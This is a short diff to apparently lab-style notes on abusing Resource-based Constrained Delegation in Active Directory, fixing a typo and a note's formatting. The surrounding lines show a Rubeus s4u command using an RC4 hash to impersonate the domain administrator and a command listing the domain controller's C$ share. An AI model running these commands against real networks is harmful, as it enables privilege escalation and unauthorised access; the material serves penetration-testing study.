@@ -64,8 +64,8 @@ Resource-based Constrained Delegation was introduced in Windows Server 2012.
   ```powershell
   .\Rubeus.exe s4u /user:HACKTHEBOX$ /rc4:CF767C9A9C529361F108AA67BF1B3695 /impersonateuser:administrator /msdsspn:cifs/dc01.inlanefreight.local /ptt
   ```
-    `Note: We can also use /altservice:host,RPCSS,wsman,http,ldap,krbtgt,winrm to include aditional services to our ticket request.`
-7. Connec to the target Machine 
+  > Note: We can also use /altservice:host,RPCSS,wsman,http,ldap,krbtgt,winrm to include aditional services to our ticket request.
+7. Connect to the target Machine 
   ```powershell
   ls \\dc01.inlanefreight.local\c$
   ```
